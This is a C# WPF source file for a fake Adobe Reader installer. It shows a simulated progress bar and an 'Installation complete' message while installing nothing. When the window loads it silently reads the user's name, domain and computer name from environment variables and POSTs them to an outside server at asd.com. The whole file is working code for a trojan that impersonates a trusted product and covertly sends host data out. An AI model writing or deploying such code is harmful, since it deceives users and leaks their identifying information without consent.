using System;
using System.Text;
using System.Windows;
using System.Windows.Threading;
using System.Net;
using System.IO;

namespace FakeAdobeReaderInstaller
{
    public partial class MainWindow : Window
    {
        private DispatcherTimer disTimer = new DispatcherTimer();
        private int i = 0;
        int delta = 0;

        public MainWindow()
        {
            InitializeComponent();
            imgTick.Visibility = Visibility.Hidden;
            btnFinish.Visibility = Visibility.Hidden;
            page2.Visibility = Visibility.Hidden;
            prgbar.Value = 0;

            disTimer.Tick += new EventHandler(StartInstall);
            disTimer.Interval = new TimeSpan(0, 0, 0, 4);
            disTimer.Start();
        }

        private void StartInstall(Object o, EventArgs e)
        {
            page1.Visibility = Visibility.Hidden;
            page2.Visibility = Visibility.Visible;

            disTimer.Tick -= StartInstall;
            disTimer.Tick += new EventHandler(AnimInstall);
            disTimer.Interval = new TimeSpan(0, 0, 0, 0, 500);
        }

        private void AnimInstall(Object o, EventArgs e)
        {
            Random rnd = new Random();

            this.Dispatcher.Invoke(() =>
            {
                txtInstalling.Text = i.ToString() + "%";
                prgbar.Value = ++i;

                disTimer.Interval = new TimeSpan(0, 0, 0, 0, rnd.Next(1, 3) * (100 + delta));
                if (i == 50)
                {
                    delta = 500;
                    txtStatus.Text = "Installing...";
                }
                else if (i == 100)
                {
                    disTimer.Stop();

                    txtStatus.Text = "Installation complete";
                    imgTick.Visibility = Visibility.Visible;
                    btnFinish.Visibility = Visibility.Visible;
                    txtInstalling.Visibility = Visibility.Hidden;
                }
            });
        }

        private void button_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            SendPOST("https://asd.com/index.php");
        }

        private void SendPOST(string serverName)
        {
            string msg_username = System.Environment.GetEnvironmentVariable("USERNAME", EnvironmentVariableTarget.Process);
            string msg_userdomain = System.Environment.GetEnvironmentVariable("USERDOMAIN", EnvironmentVariableTarget.Process);
            string msg_computername = System.Environment.GetEnvironmentVariable("COMPUTERNAME", EnvironmentVariableTarget.Process);
            string strData = "s=3&username=" + msg_username + "&userdomain=" + msg_userdomain + "&computername=" + msg_computername;
            byte[] data = Encoding.ASCII.GetBytes(strData);

            WebRequest request = WebRequest.Create(serverName);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;
            using (Stream stream = request.GetRequestStream())
            {
                stream.Write(data, 0, data.Length);
            }
        }
    }
}
